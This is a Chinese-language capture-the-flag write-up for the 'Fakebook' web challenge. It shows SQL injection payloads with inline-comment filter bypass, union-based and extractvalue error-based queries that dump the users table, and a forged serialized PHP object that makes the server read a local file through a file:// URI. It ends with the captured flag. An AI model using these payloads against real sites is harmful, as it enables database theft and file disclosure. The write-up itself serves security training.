# Fakebook

> sql注入+文件泄露+LFR

## 思路分析

> sql注入+目录遍历+文件泄露+LFR,先注册账号,登陆,点击账号,发现一处sql注入点,sql注入用sqlmap不能用,可用内联注释绕过,order by判断出有4列,用联合注入或者报错注入获取数据.联合注入时no参数要为-1,为-1是因为要让服务端返回union select的结果,把no设置为-1,因为数据库没有-1的数据,所有会返回select的结果.

```
-1 union/**/select1,database(),3,4#
-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
-1 union/**/select 1,group_concat(no,'|',username,'|',passwd,'|',data),3,4 from users#
```

```
1^extractvalue(1,concat(1,(select(group_concat(database())))));#
1^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'mysq'))));#
1^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'fakebook'))));#
1^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'users'))));#
1^extractvalue(1,concat(1,(select(left(data,30))from(users))));#
```

> 现在data的字段是序列化字符串,说明还有其他的切入点没有发现,进行信息收集,发现robots.txt,访问,发现user.php.bak,下载得到备份的源码.分析源码得知getBlogContents函数是从blog的值处获取内容并返回的,blog的内容是注册时用户控制的,此处存在LFR漏洞,如果没有sValidBlog这个函数,直接file:///var/www/html/flag.php就能拿到flag.

> 那为什么会有序列化？是在注册后,把注册时提交的信息序列化一下,然后存到数据库的data字段中的,然后在user界面,从数据库中获取data数据,进行反序列化展现在页面上的.这时可以人为构造联合查询返回语句,data字段在第四个位置.union select联合查询,即合并(取交集,结果中没有重复行)前后两个查询,所有union select前面要查的值是不存在的一个值才行.构造请求后的网页源码里有一串base64字符,解码得到flag

## payload

> ?no=0/**/union\/*\*/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

## flag

> flag{c1e552fdf77049fabf65168f22f7aeab}